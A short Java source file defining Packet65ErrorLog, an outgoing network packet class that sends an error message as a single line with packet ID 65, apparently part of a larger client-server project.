package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet65ErrorLog extends AbstractOutgoingPacket {
	
	private String error;

	public Packet65ErrorLog(String error) {
		this.error = error;
	}
	
	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(error);
	}

	@Override
	public byte getPacketId() {
		return 65;
	}

}
